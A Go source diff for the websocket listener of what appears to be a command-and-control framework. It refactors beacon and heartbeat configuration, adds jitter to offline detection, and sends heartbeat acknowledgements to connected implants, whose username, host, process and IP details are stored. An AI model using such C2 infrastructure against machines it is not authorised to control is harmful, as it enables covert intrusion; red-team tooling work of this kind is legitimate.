@@ -294,7 +294,8 @@ func handleWSConn(ws *websocket.Conn, vkey, salt []byte, derivedMK []byte) {
 			}
 
 			// 监听器心跳配置(客户端二进制 patch 的同一值;离线检测器阈值用客户端上报 sleep)
-			heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(ws.LocalAddr().String(), "websocket")
+			beaconCfg := database.GetListenerBeaconConfigByAddr(ws.LocalAddr().String(), "websocket")
+			heartbeatTimeout, heartbeatInterval := beaconCfg.HeartbeatTimeout, beaconCfg.HeartbeatInterval
 
 			var client database.Clients
 			exsists, _ := database.DB().Where("uid = ?", uid).Get(&client)
@@ -343,7 +344,7 @@ func handleWSConn(ws *websocket.Conn, vkey, salt []byte, derivedMK []byte) {
 					arch = "x64"
 				}
 
-				database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: "websocket", Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
+				database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveListenerSleep(osArray, beaconCfg)), Online: "1", Color: "", Listener: "websocket", Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
 				database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
 				database.DB().Insert(&database.Notes{Uid: uid, Note: ""})
 
@@ -373,8 +374,8 @@ func handleWSConn(ws *websocket.Conn, vkey, salt []byte, derivedMK []byte) {
 			// 原实现 10s×30 次=300s 才判死,统一阈值约 4.5×sleep 且全协议一致)
 			if connection.GlobalOfflineDetector != nil {
 				clientMeta := strings.Split(string(metainfo[9:]), "\t")
-				sleepSec := connection.ResolveSleepSeconds(clientMeta, heartbeatInterval)
-				connection.GlobalOfflineDetector.Register(uid, "websocket", sleepSec, func() {
+				sleepSec := connection.ResolveListenerSleep(clientMeta, beaconCfg)
+				connection.GlobalOfflineDetector.Register(uid, "websocket", sleepSec, beaconCfg.JitterPercent, func() {
 					// 离线判定时:仅删仍指向本连接的映射,关连接 → 读循环退出 → defer 完整清理
 					MuClientManager.Lock()
 					if cur, ok := ClientManager[uid]; ok && cur == ws {
@@ -462,6 +463,21 @@ func handleWSConn(ws *websocket.Conn, vkey, salt []byte, derivedMK []byte) {
 			// 已删除的 checkHeartbeats 使用,现由检测器 GetLastActive 供在线判定）
 			if connection.GlobalOfflineDetector != nil {
 				connection.GlobalOfflineDetector.Touch(uid)
+			}
+
+			// 回心跳 ack：客户端 RecvDeadline 以"每拍服务端有回包"为前提（TCP/KCP/
+			// forward 都回，WS 原先漏了）。不回 ack 时，健康的空闲 WS 连接会在读超时
+			// 后误判服务端死亡并反复重连。写操作与命令下发共用每连接写锁，防帧交错。
+			if ack := command.BuildHeartbeatAckBytes(uid); ack != nil {
+				writeLock := GetWriteLock(uid)
+				writeLock.Lock()
+				ws.SetWriteDeadline(time.Now().Add(10 * time.Second))
+				werr := ws.WriteMessage(websocket.BinaryMessage, ack)
+				writeLock.Unlock()
+				if werr != nil {
+					logx.Warnf("⚠️ [WS] 心跳 ack 写入失败: %s, 错误: %v", uid, werr)
+					return
+				}
 			}
 		}
 	}
